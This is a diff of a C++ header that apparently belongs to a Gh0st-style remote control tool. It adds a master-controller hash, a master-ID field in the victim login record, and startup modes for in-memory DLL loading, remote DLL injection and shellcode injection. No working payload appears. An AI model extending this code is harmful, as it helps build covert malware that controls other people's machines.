@@ -61,6 +61,7 @@ typedef void* LPVOID, * HANDLE;
 #include <string>
 #include <vector>
 #include <time.h>
+#include <unordered_map>
 
 #ifndef _MAX_PATH
 #define _MAX_PATH 260
@@ -71,6 +72,9 @@ typedef void* LPVOID, * HANDLE;
 #define FLAG_FINDEN "Hello, World!"
 
 #define FLAG_GHOST	FLAG_FINDEN
+
+// 主控程序唯一标识
+#define MASTER_HASH "61f04dd637a74ee34493fc1025de2c131022536da751c29e3ff4e9024d8eec43"
 
 // 当程序功能明显发生变化时，应该更新这个值，以便对被控程序进行区分
 #define DLL_VERSION __DATE__		// DLL版本
@@ -265,6 +269,59 @@ inline const char* GetClientType(int typ) {
 	}
 }
 
+inline int compareDates(const std::string& date1, const std::string& date2) {
+	static const std::unordered_map<std::string, int> monthMap = {
+		{"Jan", 1}, {"Feb", 2}, {"Mar", 3}, {"Apr", 4}, {"May", 5}, {"Jun", 6},
+		{"Jul", 7}, {"Aug", 8}, {"Sep", 9}, {"Oct",10}, {"Nov",11}, {"Dec",12}
+	};
+
+	auto parse = [&](const std::string& date) -> std::tuple<int, int, int> {
+		int month = monthMap.at(date.substr(0, 3));
+		int day = std::stoi(date.substr(4, 2));
+		int year = std::stoi(date.substr(7, 4));
+		return { year, month, day };
+	};
+
+	try {
+		auto t1 = parse(date1);
+		auto t2 = parse(date2);
+		int y1 = std::get<0>(t1), m1 = std::get<1>(t1), d1 = std::get<2>(t1);
+		int y2 = std::get<0>(t2), m2 = std::get<1>(t2), d2 = std::get<2>(t2);
+
+		if (y1 != y2) return y1 < y2 ? -1 : 1;
+		if (m1 != m2) return m1 < m2 ? -1 : 1;
+		if (d1 != d2) return d1 < d2 ? -1 : 1;
+		return 0;
+	}
+	catch (const std::exception& e) {
+		std::cerr << "Date parse error: " << e.what() << std::endl;
+		return -2; // 返回特殊值表示出错
+	}
+}
+
+// 此枚举值和ClientType相似，但又不是完全一致，专为`TestRun`定制
+// 指本质上运行`ServerDll`的形式
+// `TestRun` 只用于技术研究目的
+enum TestRunType {
+	Startup_DLL,			// 磁盘DLL
+	Startup_MEMDLL,			// 内存DLL（无磁盘文件）
+	Startup_InjDLL,			// 远程注入 DLL（注入DLL路径，仍依赖磁盘DLL）
+	Startup_Shellcode,		// 本地 Shell code （在当前程序执行shell code ）
+	Startup_InjSC,			// 远程 Shell code （注入其他程序执行shell code ）
+};
+
+inline int MemoryFind(const char* szBuffer, const char* Key, int iBufferSize, int iKeySize)
+{
+	for (int i = 0; i < iBufferSize - iKeySize; ++i)
+	{
+		if (0 == memcmp(szBuffer + i, Key, iKeySize))
+		{
+			return i;
+		}
+	}
+	return -1;
+}
+
 // 所连接的主控程序信息
 typedef struct CONNECT_ADDRESS
 {
@@ -276,7 +333,8 @@ public:
 	bool            bEncrypt;
 	char            szBuildDate[12];
 	int             iMultiOpen;
-	char            szReserved[134]; // 占位，使结构体占据300字节
+	int				iStartup;		 // 启动方式
+	char            szReserved[130]; // 占位，使结构体占据300字节
 
 public:
 	void SetType(int typ) {
@@ -284,6 +342,12 @@ public:
 	}
 	const void* Flag() const {
 		return szFlag;
+	}
+	CONNECT_ADDRESS ModifyFlag(const char* flag) const {
+		CONNECT_ADDRESS copy = *this;
+		memset(copy.szFlag, 0, sizeof(szFlag));
+		memcpy(copy.szFlag, flag, strlen(flag));
+		return copy;
 	}
 	int FlagLen() const {
 		return strlen(szFlag);
@@ -344,7 +408,8 @@ typedef struct  LOGIN_INFOR
 	char					OsVerInfoEx[156];						// 2.版本信息
 	unsigned int			dwCPUMHz;								// 3.CPU主频
 	char					moduleVersion[24];						// 4.DLL模块版本
-	char					szPCName[_MAX_PATH];					// 5.主机名
+	char					szPCName[240];							// 5.主机名
+	char					szMasterID[20];							// 5.1 主控ID
 	int						bWebCamIsExist;							// 6.是否有摄像头
 	unsigned int			dwSpeed;								// 7.网速
 	char					szStartTime[20];						// 8.启动时间
